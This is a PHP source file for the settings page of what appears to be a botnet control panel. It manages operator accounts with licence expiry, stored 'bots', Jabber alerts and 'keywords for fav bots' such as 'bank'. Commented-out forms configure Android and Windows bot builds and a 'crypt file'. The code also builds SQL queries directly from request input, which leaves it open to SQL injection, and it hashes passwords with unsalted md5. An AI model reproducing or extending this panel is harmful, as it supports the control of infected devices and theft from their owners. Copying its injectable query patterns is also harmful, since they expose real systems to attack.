<?php
	include "config.php";
	
	if($_POST['op']!=""){
		switch($_POST['op']){
			case "adduser":
				$params = array();
				$sql = "insert into users (login,password,session,time_last_seen,license,params)values('".$_POST['user']."','".md5($_POST['pass'])."','0','0','".(mktime()+2592000)."','');";
				$dbm->query($sql);
				notification_add("Add new user ".$_POST['user'],"settings.php",1);
				break;
				
			case "changepass":
				$sql = "update users set password='".md5($_POST['pass'])."' where id='".$_POST['id']."';";
				$dbm->query($sql);
				notification_add("Password for ".$_POST['id']." changed","settings.php",1);
				break;
				
			case "setparams":
				set_user_param($_POST['name'],$_POST['value']);
				break;
				
/*			case "andsetupbot":
				set_user_param("and_bot_name",$_POST['name']);
				$ico = file_get_contents($_FILES['ico']['tmp_name']);
				$ico = base64_encode($ico);
				set_user_param("and_bot_ico",$ico);
				set_user_param("and_bot_update_flag",0);
				notification_add("Update compile bot info","settings.php",1);
				break;
			case "winsetupbot":
				//set_user_param("win_bot_name",$_POST['name']);
				$ico = file_get_contents($_FILES['ico']['tmp_name']);
				$ico = base64_encode($ico);
				set_user_param("win_bot_ico",$ico);
				set_user_param("win_bot_update_flag",0);
				notification_add("Update compile bot info","settings.php",1);
				break;*/
		}
		
		header("Location: settings.php");
		die();
	}
	
	if($_GET['op']){
		switch($_GET['op']){
			case "deluser":
				$sql = "delete from users where id='".$_GET['id']."';";
				$dbm->query($sql);
				notification_add("Delete user ".$_GET['id'],"settings.php",1);
				break;
			case "cleandb":
				$sql = "delete from bots where bot_user_id='".$kernel['userid']."'";
				$dbm->query($sql);
				break;
		}
		header("Location: settings.php");
		die();
	}
	
	print_header();
	
	print_menu();
	
	$html = "
	
	<div class=\"row\">
    <div class=\"col-lg-6\">
    
	  <div class=\"panel panel-default\">
	  
		<div class=\"panel-heading\">Jabber settings</div>
	  
		<div class=\"panel-body\">
		  <form action=\"settings.php\" method=post>
		    <input type=hidden name=op value=setparams>
		    <input type=hidden name=name value=jabber>
			<div class=\"form-group\">
			  <input type=\"text\" class=\"form-control\" id=\"email\" placeholder=\"Jabber to notification\" name=\"value\" value=\"".get_user_param("jabber")."\">
			</div>
			<button type=\"submit\" class=\"btn btn-default\">Save!</button>
		  </form>
		  
		  </div>
	</div>
	  <br>
	<div class=\"panel panel-default\">
	  
		<div class=\"panel-heading\">Keywords for fav bots</div>
	  
		<div class=\"panel-body\">
		  <form action=\"settings.php\" method=post>
		     <input type=hidden name=op value=setparams>
		    <input type=hidden name=name value=keywords>
			<div class=\"form-group\">
			  <input type=\"text\" class=\"form-control\" id=\"email\" placeholder=\"luciya,bank,dick,...\" name=\"value\" value=\"".get_user_param("keywords")."\">
			</div>
			<button type=\"submit\" class=\"btn btn-default\">Save!</button>
		  </form>
		  
		  </div>
	</div>  
<!--	  <br>
	  <div class=\"panel panel-default\">
	  
		<div class=\"panel-heading\">Android build settings (";
			if(get_user_param("and_bot_update_flag")=="0" || get_user_param("and_bot_update_flag")==""){
				$html .= "<font color=red>wait new build with new param</font>";
			}else{
				$html .= "<font color=green>Android build updated</font>";
			}
		$html .=")</div>
	  
		<div class=\"panel-body\">
		  <form action=\"settings.php\" method=\"post\" enctype=\"multipart/form-data\">
		     <input type=hidden name=op value=andsetupbot>
			<div class=\"form-group\">
			  <input type=\"text\" class=\"form-control\" id=\"email\" placeholder=\"name : example install\" name=\"name\" value=\"".get_user_param("and_bot_name")."\">
			</div>
			<div class=\"form-group\">
			  ";
			  $ico = get_user_param("and_bot_ico");
			  //var_dump($kernel);
			  if(strlen($ico)>0){
				  $html .= "<img src=\"data:image/png;base64, ".$ico."\" alt=\"bot icon\">";
			  }
			  $html .="
			  <input type=\"file\" class=\"form-control\" id=\"email\" placeholder=\"install\" name=\"ico\">
			</div>
			<button type=\"submit\" class=\"btn btn-default\">Save!</button> P.S. update applyed for next uploaded crypt file...
		  </form>
		  
		  </div>
	</div>
	
	<br>
	  <div class=\"panel panel-default\">
	  
		<div class=\"panel-heading\">Windows build settings (";
			if(get_user_param("win_bot_update_flag")=="0" || get_user_param("win_bot_update_flag")==""){
				$html .= "<font color=red>wait new build with new param</font>";
			}else{
				$html .= "<font color=green>Windows build updated</font>";
			}
		$html .=")</div>
	  
		<div class=\"panel-body\">
		  <form action=\"settings.php\" method=\"post\" enctype=\"multipart/form-data\">
		     <input type=hidden name=op value=winsetupwinbot>
			<div class=\"form-group\">
			  ";
			  $ico = get_user_param("win_bot_ico");
			  //var_dump($kernel);
			  if(strlen($ico)>0){
				  $html .= "<img src=\"data:image/png;base64, ".$ico."\" alt=\"bot icon\">";
			  }
			  $html .="
			  <input type=\"file\" class=\"form-control\" id=\"email\" placeholder=\"install\" name=\"ico\">
			</div>
			<button type=\"submit\" class=\"btn btn-default\">Save!</button> P.S. update applyed for next uploaded crypt file...
		  </form>
		  
		  </div>
	</div>-->  
	  <br>
	  
	<div class=\"panel panel-default\">
		<div class=\"panel-heading\">Security key</div>
	  
		<div class=\"panel-body\">
		  <form action=\"/settings.php\">
			<div class=\"form-group\">
			  <input type=\"text\" class=\"form-control\" id=\"email\" placeholder=\"Key\" name=\"num\">
			</div>
			<button type=\"submit\" class=\"btn btn-default\">Save!</button>
		  </form>
		  
		  </div>
		</div>
	  
	  </div>
	  
	  
	  <div class=\"col-lg-6\">
	  
	  <div class=\"panel panel-default\">
		<div class=\"panel-heading\">Database usage</div>
	  
		<div class=\"panel-body\">
		  <b>Last export date : </b> ".date("M")."<hr>
		  <button type=\"button\" class=\"btn btn-success\">Export</button>
			<button type=\"button\" class=\"btn btn-warning\">Import</button>
			<button type=\"button\" class=\"btn btn-danger\" onclick=\"location.href='settings.php?&op=cleandb';\">Clean</button>
		  
		  </div>
		</div>
	  
	  
	  
	  
	  ";
	  
	  if($kernel['userid']==1){
		  $html .= "<br><div class=\"panel panel-default\">
						<div class=\"panel-heading\">Users</div>
							<div class=\"panel-body\"><br>";
			  
			$sql = "select * from users where id!=1";
			$res = $dbm->query($sql);
			if($dbm->count>0){
				while($row=mysqli_fetch_array($res)) {
					$html .= "id: $row[0] - " .$row[1]." - [<a href=settings.php?op=deluser&id=$row[0]>delete</a>] - License to ".round(($row[5]-time())/60/60/24)." days left<br>";
				}
			}
			  
		  $html .= "
		  add user<br>
			<form action=\"\" method=\"post\">
				<input type=hidden name=op value=adduser>
				nick : <input type=text name=user><br>
				pass : <input type=text name=pass><br>
				<input type=submit value=add><br>
			</form><br>
			
			Change password<br>
			<form action=\"\" method=\"post\">
				<input type=hidden name=op value=changepass>
				id : <input type=text name=id><br>
				pass : <input type=text name=pass><br>
				<input type=submit value=change><br>
			</form>
		  ";
		  
		  $html .= "</div></div></div>
		  
		  ";
	}
	  $html .= "
	  
	  </div>
	  
	  
	  
	  
	  
	  </div>
	  
	";

	print_content("Settings panel",$html);
	
	print_footer();
?>
